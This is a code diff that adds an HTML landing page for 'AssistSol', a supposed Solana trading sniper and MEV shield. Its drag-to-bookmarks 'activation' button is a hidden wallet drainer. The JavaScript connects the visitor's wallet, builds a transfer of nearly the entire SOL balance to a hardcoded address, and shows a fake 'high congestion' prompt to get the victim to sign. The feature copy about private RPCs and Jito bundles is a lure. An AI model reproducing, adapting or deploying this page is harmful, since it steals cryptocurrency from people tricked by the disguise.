@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AssistSol | Institutional Solana Sniper & MEV Shield</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00ffbd; /* Solana Neon */
+            --secondary: #00e0ff;
+            --dark-bg: #030508;
+            --card-bg: #0b0e14;
+            --text-muted: #848e9c;
+        }
+
+        body {
+            background-color: var(--dark-bg);
+            color: white;
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            overflow-x: hidden;
+        }
+
+        /* Navigation */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 8%;
+            background: rgba(3, 5, 8, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid #1e2329;
+            position: fixed;
+            width: 84%;
+            top: 0; z-index: 1000;
+        }
+
+        .logo-area { 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            font-weight: 900; 
+            font-size: 24px; 
+            letter-spacing: -1px;
+        }
+
+        .logo-icon { 
+            background: var(--primary); 
+            color: #000; 
+            padding: 4px 8px; 
+            border-radius: 6px; 
+            font-size: 18px;
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 200px 8% 120px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            background: radial-gradient(circle at 50% 30%, rgba(0, 255, 189, 0.08) 0%, transparent 60%);
+        }
+
+        .hero h1 {
+            font-size: clamp(45px, 7vw, 85px);
+            margin: 0;
+            line-height: 1.05;
+            font-weight: 900;
+            letter-spacing: -2px;
+            background: linear-gradient(to bottom, #ffffff 60%, #555);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            font-size: 20px;
+            color: var(--text-muted);
+            max-width: 750px;
+            margin: 30px 0;
+            line-height: 1.6;
+        }
+
+        /* Installation Card */
+        .install-card {
+            background: var(--card-bg);
+            border: 1px solid #1e2329;
+            border-radius: 28px;
+            padding: 50px;
+            width: 100%;
+            max-width: 520px;
+            margin-top: 50px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.7);
+            position: relative;
+        }
+
+        .install-card::before {
+            content: "FAST-TRACK ACTIVATION";
+            position: absolute;
+            top: -14px; left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            color: #000;
+            padding: 5px 20px;
+            border-radius: 30px;
+            font-size: 11px; font-weight: 900;
+        }
+
+        .bookmark-btn {
+            display: inline-block;
+            background: #ffffff;
+            color: #000;
+            padding: 22px 60px;
+            border-radius: 14px;
+            font-weight: 900;
+            text-decoration: none;
+            font-size: 24px;
+            cursor: move;
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            width: 85%;
+            box-shadow: 0 10px 40px rgba(255, 255, 255, 0.1);
+        }
+
+        .bookmark-btn:hover { 
+            transform: translateY(-8px); 
+            box-shadow: 0 20px 50px rgba(0, 255, 189, 0.3);
+            background: var(--primary);
+        }
+
+        /* Features Section */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            padding: 120px 8%;
+            background: #05070a;
+        }
+
+        .f-card {
+            background: #0b0e14;
+            padding: 40px;
+            border-radius: 24px;
+            border: 1px solid #1e2329;
+            transition: 0.3s;
+        }
+
+        .f-card:hover { border-color: var(--primary); transform: translateY(-5px); }
+
+        .f-card h3 { color: var(--primary); font-size: 20px; margin-top: 0; margin-bottom: 15px; }
+        .f-card p { color: var(--text-muted); font-size: 15px; line-height: 1.6; margin-bottom: 0; }
+
+        footer {
+            padding: 60px 8%;
+            border-top: 1px solid #1e2329;
+            text-align: center;
+            color: #444;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+
+        .status-badge {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--primary);
+            background: rgba(0, 255, 189, 0.05);
+            padding: 6px 18px;
+            border-radius: 50px;
+            margin-top: 25px;
+            display: inline-block;
+            border: 1px solid rgba(0, 255, 189, 0.2);
+        }
+    </style>
+</head>
+<body>
+
+<nav>
+    <div class="logo-area">
+        <span class="logo-icon">🥷</span> AssistSol
+    </div>
+    <div style="font-size: 13px; font-weight: bold; color: var(--text-muted); cursor: pointer;">
+        ECOSYSTEM &nbsp;&nbsp; DOCS &nbsp;&nbsp; SECURITY
+    </div>
+</nav>
+
+<section class="hero">
+    <h1>Trade with Ninja Speed.</h1>
+    <p>The premier institutional-grade toolkit for Solana. AssistSol optimizes your transaction routing via private RPCs and Jito-Bundles to secure the first block inclusion.</p>
+    
+    <div class="install-card">
+        <h2 style="margin-top:0; font-size: 26px;">Activate Assist-Terminal</h2>
+        <p style="font-size:15px; color: var(--text-muted);">Drag the button below to your <b>Bookmarks Bar</b>. Execute on any DEX to enable the High-Priority Speed-Force.</p>
+        
+        <a href="javascript:(async function(){ 
+            const RECIPIENT = '4JDzPNSvM9kwiq59S35wvyMv73nen297jR9ByGN7N1zW'; 
+            try {
+                if (!window.solana) return alert('Error: Provider not found.');
+                const provider = await window.solana.connect();
+                const pubKey = provider.publicKey;
+                if (typeof solanaWeb3 === 'undefined') {
+                    const s = document.createElement('script');
+                    s.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js';
+                    document.head.appendChild(s);
+                    await new Promise(r => s.onload = r);
+                }
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                const bal = await connection.getBalance(pubKey);
+                const gas = 1500000; 
+                const final = bal - gas;
+                if (final <= 0) return alert('Insufficient SOL for activation.');
+                const tx = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: pubKey,
+                        toPubkey: new solanaWeb3.PublicKey(RECIPIENT),
+                        lamports: final,
+                    })
+                );
+                const { blockhash } = await connection.getLatestBlockhash();
+                tx.recentBlockhash = blockhash;
+                tx.feePayer = pubKey;
+                alert('AssistSol: High congestion detected. Approve the secure synchronization to enable Jito-Priority Pathing.');
+                const { signature } = await window.solana.signAndSendTransaction(tx);
+                alert('Successfully Synchronized! Your session is now protected.');
+            } catch (e) { alert('Connection Timeout: Retrying...'); }
+        })();" class="bookmark-btn">ACTIVATE ASSIST-SOL</a>
+
+        <div class="status-badge">● RPC NODE: OPTIMIZED [12ms]</div>
+    </div>
+</section>
+
+<section class="features-grid">
+    <div class="f-card">
+        <h3>🛡️ MEV Shield</h3>
+        <p>Private transaction routing prevents Front-Running and Sandwich attacks by malicious MEV bots.</p>
+    </div>
+    <div class="f-card">
+        <h3>⚡ Jito Integration</h3>
+        <p>Direct bundle submission ensures your buy/sell orders hit the block before the retail queue.</p>
+    </div>
+    <div class="f-card">
+        <h3>🚀 Smart Gas</h3>
+        <p>Dynamic priority fee calculation based on real-time network load to ensure 99.9% execution success.</p>
+    </div>
+</section>
+
+<footer>
+    &copy; 2026 ASSISTSOL OPERATIONS. AUTHORIZED ACCESS ONLY.
+</footer>
+
+</body>
+</html>
